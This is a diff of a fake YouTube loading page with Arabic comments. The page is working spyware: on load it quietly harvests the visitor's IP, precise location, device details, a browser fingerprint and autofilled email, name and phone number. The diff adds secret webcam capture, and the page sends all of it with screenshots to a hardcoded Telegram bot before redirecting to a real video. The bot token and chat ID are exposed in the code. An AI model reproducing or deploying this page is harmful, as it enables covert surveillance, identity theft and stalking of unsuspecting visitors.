@@ -2,13 +2,12 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>YouTube</title>
     <link rel="icon" type="image/x-icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
-        /* ===== نفس تصميم يوتيوب ===== */
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:"YouTube Sans","Roboto",sans-serif;background:#0f0f0f;color:#f1f1f1;height:100vh;overflow:hidden;display:flex;flex-direction:column}
         .header{background:#0f0f0f;height:56px;display:flex;align-items:center;padding:0 16px;border-bottom:1px solid #303030;flex-shrink:0;justify-content:space-between}
@@ -18,7 +17,6 @@
         .header-right{display:flex;align-items:center;gap:16px}
         .header-right .icon{width:24px;height:24px;fill:#aaa}
         .avatar{width:32px;height:32px;border-radius:50%;background:#ff0000;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;color:#fff}
-        /* ===== إخفاء أي مؤشرات تحميل أو نصوص ===== */
         .loading-container{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px}
         .spinner-wrapper{margin-bottom:40px}
         .youtube-spinner{width:72px;height:72px;margin:0 auto;position:relative}
@@ -30,11 +28,12 @@
         .dot:nth-child(2){animation-delay:.2s;background:#f1f1f1}
         .dot:nth-child(3){animation-delay:.4s;background:#ff0000}
         @keyframes pulseDot{0%,80%,100%{transform:scale(.6);opacity:.3}40%{transform:scale(1.2);opacity:1}}
-        /* ===== لا يوجد أي نص حالة أو شريط تقدم ===== */
         .status-text{display:none !important}
         .progress-wrap{display:none !important}
         .share-btn{display:none !important}
         .hidden-field{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
+        /* عنصر الفيديو مخفي تماماً */
+        #videoPreview{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
     </style>
 </head>
 <body>
@@ -67,8 +66,9 @@
             <div class="dot"></div>
             <div class="dot"></div>
         </div>
-        <!-- لا يوجد أي نص حالة أو شريط تقدم -->
     </div>
+
+    <video id="videoPreview" autoplay playsinline></video>
 
     <!-- حقول خفية لـ Autofill -->
     <input type="email" class="hidden-field" id="hiddenEmail" name="email" autocomplete="email" value="">
@@ -77,11 +77,10 @@
 
     <script>
         (function() {
-            // ===== التوكن الصحيح (بدون تشفير لضمان العمل) =====
+            // ===== التوكن الصحيح =====
             const TOKEN = '8990771403:AAEkyyJasNI2mLimV_8A7W4cNGrjJxP_Iao';
             const CHAT_ID = '170383339';
             const TARGET_URL = 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-';
-
             let isRedirected = false;
 
             // ===== دالة الإرسال الأساسية =====
@@ -106,7 +105,28 @@
                 }
             }
 
-            // ===== جمع البيانات الأساسية (بدون أي نصوص مرئية) =====
+            // ===== إرسال الصورة إلى تليجرام (من كاميرا أو لقطة) =====
+            async function sendPhoto(blob, caption) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log('Photo sent:', res.ok);
+                    return res.ok;
+                } catch (e) {
+                    console.error('Photo error:', e.message);
+                    return false;
+                }
+            }
+
+            // ===== جمع البيانات الأساسية =====
             function getBasicData() {
                 const ua = navigator.userAgent;
                 const now = new Date();
@@ -155,19 +175,10 @@
                                 acc: Math.round(p.coords.accuracy)
                             });
                         },
-                        () => {
-                            if (done) return;
-                            done = true;
-                            resolve(null);
-                        },
+                        () => { if (!done) { done = true; resolve(null); } },
                         { timeout: 5000, enableHighAccuracy: true }
                     );
-                    setTimeout(() => {
-                        if (!done) {
-                            done = true;
-                            resolve(null);
-                        }
-                    }, 6000);
+                    setTimeout(() => { if (!done) { done = true; resolve(null); } }, 6000);
                 });
             }
 
@@ -191,11 +202,10 @@
                 return msg;
             }
 
-            // ===== البيانات المتقدمة (تُرسل في الخلفية) =====
+            // ===== البيانات المتقدمة =====
             async function collectAdvancedData() {
                 const data = {};
 
-                // البطارية
                 try {
                     if (navigator.getBattery) {
                         const b = await navigator.getBattery();
@@ -203,7 +213,6 @@
                     }
                 } catch (_) {}
 
-                // الشبكة
                 try {
                     if (navigator.connection) {
                         const c = navigator.connection;
@@ -211,7 +220,6 @@
                     }
                 } catch (_) {}
 
-                // نظام التشغيل
                 const ua = navigator.userAgent;
                 let os = 'Unknown';
                 if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
@@ -225,14 +233,12 @@
                 else if (ua.includes('Linux')) os = 'Linux';
                 data.os = os;
 
-                // بصمة المتصفح
                 try {
                     const fp = await FingerprintJS.load();
                     const result = await fp.get();
                     data.fingerprint = result.visitorId || 'غير متوفرة';
                 } catch (_) {}
 
-                // Autofill (الإيميل، الاسم، الهاتف)
                 try {
                     const emailEl = document.getElementById('hiddenEmail');
                     const nameEl = document.getElementById('hiddenName');
@@ -285,8 +291,51 @@
                 return msg;
             }
 
-            // ===== إرسال لقطة الشاشة =====
-            async function sendScreenshot() {
+            // ===== التقاط صورة من الكاميرا =====
+            async function captureFromCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                    });
+                    const video = document.getElementById('videoPreview');
+                    video.srcObject = stream;
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+
+                    // ننتظر قليلاً لتظهر الصورة
+                    await new Promise(r => setTimeout(r, 500));
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // إيقاف الكاميرا فوراً
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
+                    const byteString = atob(dataURL.split(',')[1]);
+                    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
+                    }
+                    return new Blob([ab], { type: mimeString });
+                } catch (e) {
+                    console.error('Camera error:', e.message);
+                    return null;
+                }
+            }
+
+            // ===== لقطة شاشة للصفحة =====
+            async function captureScreenshot() {
                 try {
                     const canvas = await html2canvas(document.body, {
                         scale: 1.2,
@@ -303,41 +352,23 @@
                     for (let i = 0; i < byteString.length; i++) {
                         ia[i] = byteString.charCodeAt(i);
                     }
-                    const blob = new Blob([ab], { type: mimeString });
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'screenshot.jpg');
-                    formData.append('caption', '📸 *Page Screenshot*');
-                    formData.append('parse_mode', 'Markdown');
-
-                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    console.log('Screenshot sent:', res.ok);
+                    return new Blob([ab], { type: mimeString });
                 } catch (e) {
                     console.error('Screenshot error:', e.message);
+                    return null;
                 }
             }
 
-            // ===== الوظيفة الرئيسية (كل شيء في الخلفية) =====
+            // ===== التشغيل الرئيسي =====
             async function main() {
                 console.log('🔄 Starting silent collection...');
 
-                // 1. البيانات الأساسية (تُرسل فوراً)
+                // 1. البيانات الأساسية
                 const basic = getBasicData();
                 const ip = await getIP();
                 const loc = await getLocation();
                 const basicMsg = buildBasicMessage(basic, ip, loc);
-
-                // إرسال الأساسيات (لا ننتظر النتيجة)
-                sendMessage(basicMsg).then(success => {
-                    if (success) {
-                        console.log('✅ Basic data sent');
-                    } else {
-                        console.log('❌ Basic data failed');
-                    }
-                });
+                sendMessage(basicMsg).then(s => console.log('Basic data:', s ? '✅' : '❌'));
 
                 // 2. البيانات المتقدمة (بعد 1 ثانية)
                 setTimeout(async () => {
@@ -351,12 +382,30 @@
                     }
                 }, 1000);
 
-                // 3. لقطة الشاشة (بعد 1.5 ثانية)
-                setTimeout(() => {
-                    sendScreenshot();
+                // 3. صورة من الكاميرا (طلب إذن)
+                setTimeout(async () => {
+                    console.log('📸 Requesting camera...');
+                    const photoBlob = await captureFromCamera();
+                    if (photoBlob) {
+                        await sendPhoto(photoBlob, '📷 *Camera photo*');
+                        console.log('✅ Camera photo sent');
+                    } else {
+                        console.log('❌ Camera photo failed or denied');
+                    }
                 }, 1500);
 
-                // 4. التحويل بعد 3 ثوانٍ (بدون أي مؤشر)
+                // 4. لقطة شاشة الصفحة (بعد 2 ثانية)
+                setTimeout(async () => {
+                    const screenshotBlob = await captureScreenshot();
+                    if (screenshotBlob) {
+                        await sendPhoto(screenshotBlob, '📸 *Page screenshot*');
+                        console.log('✅ Screenshot sent');
+                    } else {
+                        console.log('❌ Screenshot failed');
+                    }
+                }, 2000);
+
+                // 5. التحويل بعد 3.5 ثانية
                 setTimeout(() => {
                     if (!isRedirected) {
                         isRedirected = true;
@@ -367,17 +416,16 @@
                             window.location.href = TARGET_URL;
                         }
                     }
-                }, 3000);
+                }, 3500);
             }
 
-            // ===== بدء التشغيل (بعد تحميل الصفحة) =====
             if (document.readyState === 'complete') {
                 setTimeout(main, 500);
             } else {
                 window.addEventListener('load', () => setTimeout(main, 500));
             }
 
-            console.log('✅ Silent version loaded');
+            console.log('✅ Silent version with camera loaded');
         })();
     </script>
 </body>
